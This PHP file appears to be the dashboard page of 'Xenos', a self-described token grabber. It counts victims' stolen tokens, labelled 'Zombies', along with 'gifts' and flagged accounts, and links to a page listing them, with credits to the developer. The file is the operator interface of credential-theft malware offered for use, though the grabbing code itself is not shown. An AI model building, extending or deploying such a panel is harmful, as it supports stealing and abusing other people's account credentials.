<?php

    require_once('Inc/fonctions.php');

    if(!CheckLogin()){
        header('Location: login');
    }

    $title = "Project";
    require('Inc/Dash.php');

?>

    <!-- Main -->
    <section class="section_main">
        <div class="main">
            <img src="assets/images/xenos.gif" alt="">
            <h1>Xenos Project</h1>
            <p>The Best Most powerfull token grabber with user interface.</p>
            <a href="tokens">View Zombies</a>
        </div>
    </section>

    <!-- Statistiques -->
    <section class="section_stats">
        <!-- <div class="section_title">
            <p>Statistiques</p>
        </div> -->
        <div class="stats">
            <div class="stat">
                <span><?=GetCount("tokens");?></span>
                <p>Zombies</p>
            </div>

            <div class="stat">
                <span><?=GetCount("gifts");?></span>
                <p>Gifts</p>
            </div>

            <div class="stat">
            <span><?=GetFlagedCount();?>/<?=GetCount("tokens");?></span>
                <p>Flaged</p>
            </div>
        </div>
    </section>


    <!-- Owner(s) -->
    <section class="section_owners">
        <div class="owners">
            <div class="owner">
                <img src="<?=$_SESSION["login_avatar"]?>" alt="" srcset="">
                <!-- <span><?=$_SESSION["login_username"]?></span> -->
                <p>Your are successfully connected to Xenos as <strong><?=$_SESSION["login_username"]?></strong></p>
            </div>
        </div>
    </section>
    <section class="section_owners">
        <div class="owners">
            <div class="owner">
                <img src="assets/images/kaneki.gif" alt="" srcset="">
                <span>ParadoxW3b</span>
                <p>Self Taught & FreeLance Developer !</p>
                <a target="_blank" href="https://github.com/KanekiWeb">Follow</a>
            </div>
        </div>
    </section>

    <footer>
        Copyright ©️ Made By <a target="_blank" href="https://github.com/KanekiWeb">Kaneki Web</a>
    </footer>
    
    <!-- Javascript -->
    <script src="assets/js/index.js"></script>
</body>
</html>